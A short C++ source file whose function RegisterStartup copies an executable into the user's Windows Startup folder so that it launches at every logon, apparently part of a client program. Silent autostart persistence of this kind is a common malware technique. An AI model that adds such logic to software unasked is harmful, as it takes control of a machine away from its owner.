#include "utilities.h"

void RegisterStartup(std::string fileName)
{
    std::string startupPath = "C:/Users/" + username +
        "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

    fileName.erase(fileName.length() - 4);
    fileName = fileName + ".exe";
    startupPath += fileName;

    std::ifstream clientFile(startupPath);
    if (!clientFile.is_open()) CopyFileA(fileName.data(), startupPath.data(), 0);
}